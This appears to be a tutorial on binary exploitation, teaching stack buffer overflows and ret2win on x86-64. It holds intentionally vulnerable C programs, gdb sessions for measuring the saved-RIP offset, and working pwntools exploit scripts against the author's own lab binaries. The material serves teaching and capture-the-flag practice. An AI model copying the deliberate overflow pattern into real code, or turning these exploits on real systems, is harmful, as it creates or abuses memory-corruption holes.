---
title: "Lesson 3.2: Finding the Saved RIP Offset and ret2win"
image:
  path: /assets/img/covers/pwn-3-2-finding-saved-rip-offset-ret2win.webp
  alt: "Finding the Saved RIP Offset and ret2win"
date: 2022-11-08 08:03:00 +0700
categories: ["Binary Exploitation", "Pwn · Buffer Overflow"]
tags: [pwn, buffer-overflow, ret2win, saved-rip]
render_with_liquid: false
---

In the previous lesson we overwrote a variable next to a buffer. This lesson goes straight for the bigger target: the saved RIP, the address a function jumps back to when it finishes. Overwriting it hands you control of the execution flow. ret2win is the first and most classic exercise here. The binary already contains a "win" function that normal execution never reaches, and your job is to force the program to jump into it.

![Stack frame layout with buf, saved RBP, saved RIP overwritten by win's address](/assets/img/pwn/pwn-3-2-finding-saved-rip-offset-ret2win.svg)
_The offset to saved RIP is measured with a cyclic pattern, then overwritten with the address of `win`._

**Part:** 3 · **Reading + lab time:** ~50 minutes · **Difficulty:** easy to medium

**Prerequisites:** Lesson 1.2 (call/ret, saved RIP), Lesson 3.1 (basic overflow), Lesson 2.1 (pwntools), Lesson 2.2 (cyclic in gdb).

**Tools:** gcc, gdb + pwndbg, pwntools.

## Goals

By the end of this lesson you understand what saved RIP is and why overwriting it means controlling the flow, you can find the exact offset from the start of the buffer to saved RIP using a cyclic pattern, you can write a ret2win payload (padding to saved RIP, then the target address), and you can explain the stack frame layout around the moment `ret` executes.

## Theory

### What happens when a function is called and returns

Review Lesson 1.2 to be sure. When the instruction `call func` runs, the CPU pushes the address of the instruction right after `call` onto the stack, then jumps into `func`. That pushed address is called saved RIP (or return address), the place the program returns to once `func` finishes.

Inside `func`, the prologue usually pushes the old `rbp` then allocates room for local variables, so the stack frame, from low address to high address, usually looks like this.

```
low address
  [ buf[64]        ]   <- local variable, where you write into
  [ saved RBP (8)  ]   <- the caller's rbp, saved here
  [ saved RIP (8)  ]   <- the return address
high address
```

When `func` ends, the epilogue runs `leave; ret`. The `ret` instruction pops the value at the top of the stack into RIP and jumps there. If you have overflowed the buffer so it overwrites the saved RIP slot, `ret` jumps to the address you placed. That is the entire secret behind the classic stack overflow.

### What ret2win is

ret2win (return to win): the binary already contains a function, usually named `win`, `flag`, or `secret`, that is not part of normal execution and prints a flag or hands you a shell. You do not need shellcode, you do not need complicated ROP. You just overwrite saved RIP with the address of that function. ret2win is the perfect introduction to RIP control, it isolates the skill of "find the offset and overwrite RIP" from everything else that is more complicated.

### What ret2win needs

- An overflow bug that can write far enough to reach saved RIP (the buffer is close enough, the read function reads enough bytes).
- No stack canary (or you have already defeated it). The canary sits between the buffer and saved RIP; overflowing past it without preserving its value aborts the program before `ret` runs. This lesson compiles with `-fno-stack-protector` to remove the canary.
- Knowledge of the target function's address. With No PIE (`-no-pie`) the address is fixed, you get it with `elf.sym['win']` and you're done. With PIE you have to leak the base first (that is left for Part 5).

### Why you have to measure the offset, not compute it in your head

You might think `buf[64]` means the offset to saved RIP is `64 + 8` (saved RBP) `= 72`. That is often correct, but not always. The compiler inserts 16-byte alignment padding, can move the buffer's position inside the frame, or skip pushing RBP under optimization. The only reliable way is to measure with a cyclic pattern. Measure once, know the real value, stop guessing.

## Demo

Test environment: Ubuntu 24.04, glibc 2.39, gcc 13.3. Every output below is real. The source, build script, exploit, and transcript are in the Lab section below.

### Sample binary

```c
// ret2win.c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

void win(void) {
    char flag[64];
    int fd = open("flag.txt", O_RDONLY);
    if (fd < 0) { puts("Could not open flag.txt"); _exit(1); }
    int n = read(fd, flag, sizeof(flag));
    write(1, "[+] win() ran. Flag: ", 22);
    write(1, flag, n);
    _exit(0);
}

void vuln(void) {
    char buf[64];
    puts("Say something:");
    read(0, buf, 256);           // reads 256 bytes into a 64-byte buffer: overflow
    puts("Okay, bye.");
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

`win` deliberately uses `open`/`read`/`write` (syscall wrappers) instead of `system`, so jumping straight into it runs cleanly without stack alignment trouble. Stack alignment is the subject of Lesson 3.3.

Compile it and create a fake flag.

```bash
gcc -fno-stack-protector -no-pie -O0 -o ret2win ret2win.c
echo 'picoCTF{fake_flag_for_demo}' > flag.txt
```

Confirm mitigations with checksec, which reports no canary, No PIE, and NX enabled, the right configuration for ret2win.

### Step 1: find the offset with cyclic

Generate a De Bruijn pattern (every 4-byte chunk is unique), then crash the program with it in gdb.

```python
from pwn import *
open('pat.txt', 'wb').write(cyclic(200))
```

```gdb
pwndbg> run < pat.txt
# the program receives SIGSEGV at the ret instruction
pwndbg> x/s $rsp
0x7fffffffda38: "saaataaauaaavaaa..."
```

When `ret` runs, the top of the stack holds the 4 bytes that overflowed into saved RIP, so look it up with `cyclic_find`.

```python
>>> cyclic_find(b'saaa')
72
```

The offset is 72. That means the first 72 bytes fill from `buf` through saved RBP, and byte 73 onward writes into saved RIP.

### Step 2: get the win function's address

```python
>>> elf = ELF('./ret2win')
>>> hex(elf.sym['win'])
'0x401176'
```

You can also get it from the shell with `nm ret2win | grep ' win$'`.

### Step 3: build and run the payload

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2win')
io = process('./ret2win')

offset = 72
payload = flat(
    b'A' * offset,        # padding up to saved RIP
    elf.sym['win'],       # win's address, flat turns it into p64's 8 bytes
)
io.sendafter(b'thing:\n', payload)
print(io.recvall(timeout=2).decode())
```

Use `sendafter`/`send`, not `sendline`, because `vuln` reads with `read(0, buf, 256)`, which takes raw bytes as-is, so adding `\n` only makes the payload uselessly longer (harmless here since the padding is `A`, but it is still the right habit).

The exploit produces this output.

```
Okay, bye.
[+] win() ran. Flag: picoCTF{fake_flag_for_demo}
```

"Okay, bye." prints first because `vuln` runs through its whole body before `ret` jumps into `win`. Seeing the flag line means success.

### Watching it in gdb to make it stick

Set a breakpoint right at `vuln`'s `ret` to see RIP about to be popped with your own eyes.

```gdb
pwndbg> break *vuln+62        # address of the ret instruction (check disassemble vuln)
pwndbg> run < payload.bin
pwndbg> x/gx $rsp             # what's at the top of the stack right now
0x7fffffffe9f8: 0x0000000000401176     # exactly win's address
pwndbg> stepi                 # execute the ret
pwndbg> info registers rip
rip  0x401176  0x401176 <win>          # jumped into win
```

Seeing `0x401176` on top of the stack, then RIP landing on it after `stepi`, means you understand the whole mechanism.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 3.2</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/3.2.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/3.2/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/3.2/exp_ret2win.py" download><i class="fa-solid fa-file-code"></i>exp_ret2win.py</a>
<a class="lab-file" href="/assets/labs-pwn/3.2/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/3.2/jump.c" download><i class="fa-solid fa-file-code"></i>jump.c</a>
<a class="lab-file" href="/assets/labs-pwn/3.2/ret2win.c" download><i class="fa-solid fa-file-code"></i>ret2win.c</a>
</div>
</div>

The task uses the `jump` binary below, which has a `win` function that prints a flag; find the offset and jump into `win`.

```c
// jump.c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

void win(void) {
    char f[64]; int fd = open("flag.txt", O_RDONLY);
    if (fd < 0) { puts("missing flag.txt"); _exit(1); }
    int n = read(fd, f, 64); write(1, "WIN: ", 5); write(1, f, n); _exit(0);
}

void vuln(void) {
    char buf[120];               // different buffer, so the offset differs from the demo
    puts("say it:");
    read(0, buf, 300);
}

int main(void){ setvbuf(stdout,0,_IONBF,0); vuln(); return 0; }
```

```bash
gcc -fno-stack-protector -no-pie -O0 -o jump jump.c
echo 'FLAG{your_first_ret2win}' > flag.txt
```

Here is a skeleton script, fill in the offset you measure.

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./jump')

def conn():
    return remote('host', 1337) if args.REMOTE else process('./jump')

io = conn()
offset = 0xFIXME                      # measure with cyclic
io.sendafter(b'it:\n', flat(b'A'*offset, elf.sym['win']))
print(io.recvall(timeout=2).decode())
```

Hints, in tiers.

- Hint 1: `buf[120]` but the offset is almost certainly not exactly 120. Load `cyclic(300)` in gdb, read the 4 bytes at `$rsp` when it crashes, `cyclic_find` gives the real number.
- Hint 2: get win's address with `elf.sym['win']`, do not hardcode it (too easy to mistype).
- Hint 3: `vuln` reads with `read`, use `send`/`sendafter`, no need for `sendline`.

The real result, measured and run in the Lab section below on Ubuntu 24.04, glibc 2.39, gcc 13.3, is that the offset for `jump` measured with cyclic is **136** (buf 120 + padding + saved RBP). Running `python3 exploit.py` gives this output.

```
WIN: picoCTF{fake_flag_for_demo}
```

(The Lab section below shares a demo `flag.txt` so it shows `picoCTF{fake_flag_for_demo}`; if you create your own `flag.txt` the WIN line prints that content instead.) The full transcript is in the Lab section below.

As a check, consider what offset you measured, how far it is from 120 (or 128), and whether the difference is padding or saved RBP.

## Key takeaways

- Saved RIP sits after the buffer and saved RBP; overwriting it controls the flow once `ret` runs.
- Always measure the offset with cyclic plus `cyclic_find`, never compute it in your head.
- A ret2win payload is `b'A'*offset + p64(addr_win)` (or `flat(...)`).
- You need no canary and the target function's address (No PIE gives you a fixed address).
- A function that reads with `read` wants `send`; one that reads with `gets`/`scanf` needs attention to newline/null.

## Common pitfalls

- Wrong offset from mental math: assuming it equals the buffer size and forgetting padding and saved RBP. Always measure.
- Jumping into win but still crashing, no flag: if win calls `system`/`printf`, you may hit the 16-byte stack alignment bug (movaps). Lesson 3.3 covers this. In this lesson win uses raw syscalls so it does not trip over it.
- Payload containing byte 0x0a when the program reads with gets: gets stops at newline and truncates the payload. Address `0x401176` has no `0x0a` byte so it is safe here, but always check for bad bytes.
- Misreading the pattern when the crash happens somewhere else: if the crash is not at `ret` but earlier, the 4 bytes at `$rsp` are not saved RIP. Check `rip` at the crash, and if it holds a pattern value, `ret` really did jump somewhere wrong.
- Local works, remote works too (this lesson barely depends on the environment since it's No PIE, fixed address). If remote fails, check that the binary on the server really is the one you have.

## Further reading

- ROP Emporium, the `ret2win` challenge (ropemporium.com): same idea, different architectures.
- picoCTF, the buffer overflow challenges 0 through 2.
- "Smashing The Stack For Fun And Profit" (Aleph One), the section on overwriting the return address.
